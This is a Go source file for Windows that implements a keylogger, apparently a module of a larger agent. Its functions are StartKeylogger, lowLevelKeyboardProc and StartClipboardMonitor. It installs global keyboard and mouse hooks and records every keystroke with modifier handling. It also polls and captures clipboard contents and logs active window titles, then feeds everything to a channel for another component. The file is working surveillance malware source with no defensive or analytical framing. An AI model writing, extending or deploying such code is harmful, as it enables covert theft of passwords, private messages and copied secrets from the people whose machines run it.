package main

import (
	"context"
	"fmt"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

var (
	user32           = syscall.NewLazyDLL("user32.dll")
	procSetWindowsHookEx = user32.NewProc("SetWindowsHookExW")
	procCallNextHookEx   = user32.NewProc("CallNextHookEx")
	procUnhookWindowsHookEx = user32.NewProc("UnhookWindowsHookEx")
	procGetMessage       = user32.NewProc("GetMessageW")
	procMapVirtualKey    = user32.NewProc("MapVirtualKeyW")
	procGetKeyNameText   = user32.NewProc("GetKeyNameTextW")
	procGetKeyState      = user32.NewProc("GetKeyState")
	procToUnicode        = user32.NewProc("ToUnicode")
	procGetKeyboardState = user32.NewProc("GetKeyboardState")
	procGetForegroundWindow = user32.NewProc("GetForegroundWindow")
	procGetWindowText      = user32.NewProc("GetWindowTextW")

	kernel32           = syscall.NewLazyDLL("kernel32.dll")
	procGlobalLock     = kernel32.NewProc("GlobalLock")
	procGlobalUnlock   = kernel32.NewProc("GlobalUnlock")

	procOpenClipboard    = user32.NewProc("OpenClipboard")
	procGetClipboardData = user32.NewProc("GetClipboardData")
	procCloseClipboard   = user32.NewProc("CloseClipboard")
)

const (
	WH_KEYBOARD_LL = 13
	WM_KEYDOWN     = 256
	WM_SYSKEYDOWN  = 260
	VK_SHIFT       = 0x10
	VK_CAPITAL     = 0x14
	VK_CONTROL     = 0x11
	VK_MENU        = 0x12 // ALT
	VK_V           = 0x56

	CF_UNICODETEXT = 13
	
	WH_MOUSE_LL    = 14
	WM_LBUTTONUP   = 0x0202
)

type KBDLLHOOKSTRUCT struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

var (
	globalKeyChan chan string
	hookMu        sync.Mutex
	isHookRunning bool
	lastWindowTitle string
	lastHwnd      uintptr
	lastClipboard   string
)

// StartKeylogger installs the hook and starts the message pump
func StartKeylogger(ctx context.Context, keyChan chan string) {
	hookMu.Lock()
	if isHookRunning {
		hookMu.Unlock()
		return
	}
	isHookRunning = true
	globalKeyChan = keyChan
	globalKeyChan = keyChan
	hookMu.Unlock()

	// Start Clipboard Monitor
	go StartClipboardMonitor(ctx, keyChan)

	// Install Hook
	// 0 for hMod means hook is associated with the current process
	// 0 for dwThreadId means associate with all existing threads (global) but
	// WH_KEYBOARD_LL is global by definition so threadID must be 0
	hook, _, _ := procSetWindowsHookEx.Call(
		uintptr(WH_KEYBOARD_LL),
		syscall.NewCallback(lowLevelKeyboardProc),
		0,
		0,
	)
	
	mouseHook, _, _ := procSetWindowsHookEx.Call(
		uintptr(WH_MOUSE_LL),
		syscall.NewCallback(lowLevelMouseProc),
		0,
		0,
	)

	if hook == 0 {
		return
	}

	defer procUnhookWindowsHookEx.Call(hook)

	// Windows Message Loop is required for hooks to work
	// It blocks, so we run it here.
	// But we also need to respect context cancellation.
	// GetMessage blocks until a message arrives.
	
	// We use a ticker to check context cancellation because we cannot easily interrupt GetMessage
	// in a single threaded apartment without posting a message to it.
	// Alternatively, we use PeekMessage in a loop but that burns CPU.
	// Better approach: Just let it run. When context dies, we just unhook (defer) 
	// and the message loop might hang until next keypress or we can PostQuitMessage.
	
	// Windows Message Loop is required for hooks to work
	// It blocks, so we run it here.
	// But we also need to respect context cancellation.
	
	go func() {
		<-ctx.Done()
		procUnhookWindowsHookEx.Call(hook)
		if mouseHook != 0 {
			procUnhookWindowsHookEx.Call(mouseHook)
		}
		
		// Reset running state here because StartKeylogger might not return immediately
		hookMu.Lock()
		isHookRunning = false
		hookMu.Unlock()
	}()

	var msg struct {
		Hwnd    uintptr
		Message uint32
		WParam  uintptr
		LParam  uintptr
		Time    uint32
		Pt      struct{ X, Y int32 }
	}

	// Message Pump
	for {
		// GetMessage returns -1 on error, 0 on WM_QUIT
		ret, _, _ := procGetMessage.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
		if int32(ret) <= 0 {
			break
		}
		// Typically TranslateMessage/DispatchMessage here, but we don't need them
		// as we only care about the Hook callback firing.
	}
}

func StartClipboardMonitor(ctx context.Context, keyChan chan string) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			clip := getClipboardText()
			if clip != "" && clip != lastClipboard {
				lastClipboard = clip
				sendKey("\n[CLIPBOARD: " + clip + "]\n")
			}
		}
	}
}

func lowLevelKeyboardProc(nCode int, wParam uintptr, lParam uintptr) uintptr {
	if nCode >= 0 {
		if wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN {
			kbdStruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))

			// 1. Check Window Title Change
			checkActiveWindow()

			// 2. Check Clipboard (Ctrl + V)
			isCtrlDown := false
			if state, _, _ := procGetKeyState.Call(uintptr(VK_CONTROL)); state&0x8000 != 0 {
				isCtrlDown = true
			}

			if isCtrlDown && kbdStruct.VkCode == VK_V {
				clip := getClipboardText()
				if clip != "" {
					sendKey("\n[CLIPBOARD: " + clip + "]\n")
					// Skip processing 'v' if we want, but letting it pass is fine
				}
			}
			
			// 3. Process Key
			keyName := vkCodeToString(kbdStruct.VkCode, kbdStruct.ScanCode)
			
			if keyName != "" {
				sendKey(keyName)
			}
		}
	}

	// Pass to next hook
	ret, _, _ := procCallNextHookEx.Call(0, uintptr(nCode), wParam, lParam)
	return ret
}

func lowLevelMouseProc(nCode int, wParam uintptr, lParam uintptr) uintptr {
	if nCode >= 0 {
		if wParam == WM_LBUTTONUP {
			// Trigger flush on click
			// We send a special tag that agent.go recognizes as a flush trigger
			// but we can also treat it as a newline for readability
			sendKey("\n[CLICK]\n")
		}
	}
	ret, _, _ := procCallNextHookEx.Call(0, uintptr(nCode), wParam, lParam)
	return ret
}

func sendKey(msg string) {
	select {
	case globalKeyChan <- msg:
	default:
	}
}

func checkActiveWindow() {
	hwnd, _, _ := procGetForegroundWindow.Call()
	if hwnd == 0 {
		return
	}
	
	if hwnd == lastHwnd {
		return
	}
	lastHwnd = hwnd

	buf := make([]uint16, 256)
	ret, _, _ := procGetWindowText.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), 256)
	if ret == 0 {
		return
	}

	currentTitle := syscall.UTF16ToString(buf[:ret])
	if currentTitle != lastWindowTitle {
		lastWindowTitle = currentTitle
		sendKey("\n[## " + currentTitle + " ##]\n")
	}
}

func getClipboardText() string {
	// OpenClipboard(0)
	ret, _, _ := procOpenClipboard.Call(0)
	if ret == 0 {
		return ""
	}
	defer procCloseClipboard.Call()

	// hData = GetClipboardData(CF_UNICODETEXT)
	hData, _, _ := procGetClipboardData.Call(uintptr(CF_UNICODETEXT))
	if hData == 0 {
		return ""
	}

	// ptr = GlobalLock(hData)
	ptr, _, _ := procGlobalLock.Call(hData)
	if ptr == 0 {
		return ""
	}
	defer procGlobalUnlock.Call(hData)

	// Read UTF16 string from ptr
	// We don't know length, stick to reasonably large buffer or iterate until null
	// Safe way: treat as pointer to uint16 array
	return utf16PtrToString(ptr)
}

func utf16PtrToString(p uintptr) string {
	if p == 0 {
		return ""
	}
	var res []uint16
	for {
		// Read 2 bytes (uint16)
		// Go doesn't let us read raw memory easily without unsafe
		val := *(*uint16)(unsafe.Pointer(p))
		if val == 0 {
			break
		}
		res = append(res, val)
		p += 2
	}
	return syscall.UTF16ToString(res)
}

func vkCodeToString(vkCode uint32, scanCode uint32) string {
	// Handle special keys first
	switch vkCode {
	case 0x08: return "[BACKSPACE]"
	case 0x09: return "[TAB]"
	case 0x0D: return "[ENTER]\n"
	case 0x1B: return "[ESC]"
	case 0x2E: return "[DEL]"
	// Ignore Modifiers that clutter (Shift is redundant as we catch case)
	case 0x10, 0xA0, 0xA1: return "" // VK_SHIFT, LSHIFT, RSHIFT
	// Ignore Windows Keys 
	case 0x5B, 0x5C: return "" // VK_LWIN, VK_RWIN
	}

	// Try ToUnicode for accurate character representation
	// We need to fill keyboard state manually or use GetKeyboardState.
	// Since we are not the focused app, GetKeyboardState might return our state,
	// but GetKeyState works for the interrupt level.
	// We populate a 256-byte buffer for ToUnicode
	
	var ks [256]byte
	
	// Helper to set state bit
	setKey := func(vk int) {
		if state, _, _ := procGetKeyState.Call(uintptr(vk)); state&0x8000 != 0 {
			ks[vk] = 0x80
		}
	}
	// Toggle state for CapsLock
	if state, _, _ := procGetKeyState.Call(uintptr(VK_CAPITAL)); state&0x0001 != 0 {
		ks[VK_CAPITAL] = 0x01
	}
	
	setKey(VK_SHIFT)
	setKey(VK_CONTROL)
	setKey(VK_MENU)
	
	var buf [2]uint16
	ret, _, _ := procToUnicode.Call(
		uintptr(vkCode),
		uintptr(scanCode),
		uintptr(unsafe.Pointer(&ks[0])),
		uintptr(unsafe.Pointer(&buf[0])),
		2,
		0,
	)
	
	if ret > 0 {
		return syscall.UTF16ToString(buf[:ret])
	}
	
	// Fallback to GetKeyNameText if ToUnicode fails
	lParam := (scanCode << 16)
	var nameBuf [256]uint16
	retlen, _, _ := procGetKeyNameText.Call(
		uintptr(lParam),
		uintptr(unsafe.Pointer(&nameBuf[0])),
		uintptr(len(nameBuf)),
	)
	
	if retlen > 0 {
		return "["+syscall.UTF16ToString(nameBuf[:retlen])+"]"
	}
	
	return fmt.Sprintf("[VK_%d]", vkCode)
}
